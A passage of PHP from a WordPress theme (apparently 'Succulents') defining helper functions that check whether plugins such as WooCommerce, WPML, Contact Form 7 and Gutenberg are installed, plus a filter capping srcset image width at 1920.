		return defined( 'QODE_CORE_VERSION' );
	}
}

if ( ! function_exists( 'succulents_qodef_is_woocommerce_installed' ) ) {
	/**
	 * Function that checks if Woocommerce plugin installed
	 * @return bool
	 */
	function succulents_qodef_is_woocommerce_installed() {
		return function_exists( 'is_woocommerce' );
	}
}

if ( ! function_exists( 'succulents_qodef_visual_composer_installed' ) ) {
	/**
	 * Function that checks if Visual Composer plugin installed
	 * @return bool
	 */
	function succulents_qodef_visual_composer_installed() {
		return class_exists( 'WPBakeryVisualComposerAbstract' );
	}
}

if ( ! function_exists( 'succulents_qodef_revolution_slider_installed' ) ) {
	/**
	 * Function that checks if Revolution Slider plugin installed
	 * @return bool
	 */
	function succulents_qodef_revolution_slider_installed() {
		return class_exists( 'RevSliderFront' );
	}
}

if ( ! function_exists( 'succulents_qodef_contact_form_7_installed' ) ) {
	/**
	 * Function that checks if Contact Form 7 plugin installed
	 * @return bool
	 */
	function succulents_qodef_contact_form_7_installed() {
		return defined( 'WPCF7_VERSION' );
	}
}

if ( ! function_exists( 'succulents_qodef_is_wpml_installed' ) ) {
	/**
	 * Function that checks if WPML plugin installed
	 * @return bool
	 */
	function succulents_qodef_is_wpml_installed() {
		return defined( 'ICL_SITEPRESS_VERSION' );
	}
}

if ( ! function_exists( 'succulents_qodef_max_image_width_srcset' ) ) {
	/**
	 * Set max width for srcset to 1920
	 *
	 * @return int
	 */
	function succulents_qodef_max_image_width_srcset() {
		return 1920;
	}
	
	add_filter( 'max_srcset_image_width', 'succulents_qodef_max_image_width_srcset' );
}

if ( ! function_exists( 'succulents_qodef_is_gutenberg_installed' ) ) {
    /**
     * Function that checks if Gutenberg plugin installed
     * @return bool
     */
    function succulents_qodef_is_gutenberg_installed() {
        return function_exists( 'is_gutenberg_page' ) && is_gutenberg_page();
    }
}